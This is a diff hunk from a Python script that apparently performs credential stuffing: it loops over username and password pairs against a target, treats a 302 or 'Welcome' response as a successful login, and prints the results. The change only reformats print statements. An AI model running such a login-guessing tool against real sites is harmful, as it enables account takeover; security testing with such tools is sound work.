@@ -64,31 +64,19 @@ def run(target: str, delay: float = 0.2, rounds: int = 2) -> int:
                 if code == 302 or "Welcome" in body:
                     success_count += 1
                     print(
-                        f"  round {round_idx+1}  {username}:{password:15s}  "
+                        f"  round {round_idx + 1}  {username}:{password:15s}  "
                         f"status={code}  SUCCESS"
                     )
                 else:
-                    print(
-                        f"  round {round_idx+1}  {username}:{password:15s}  "
-                        f"status={code}"
-                    )
+                    print(f"  round {round_idx + 1}  {username}:{password:15s}  status={code}")
             except error.HTTPError as e:
                 code = e.code
-                print(
-                    f"  round {round_idx+1}  {username}:{password:15s}  "
-                    f"status={code}"
-                )
+                print(f"  round {round_idx + 1}  {username}:{password:15s}  status={code}")
             except Exception:
-                print(
-                    f"  round {round_idx+1}  {username}:{password:15s}  "
-                    f"status=error"
-                )
+                print(f"  round {round_idx + 1}  {username}:{password:15s}  status=error")
             time.sleep(delay)
 
-    print(
-        f"[credential-stuffing] done: {total} attempts, "
-        f"{success_count} successful logins"
-    )
+    print(f"[credential-stuffing] done: {total} attempts, {success_count} successful logins")
     return 0
 
 
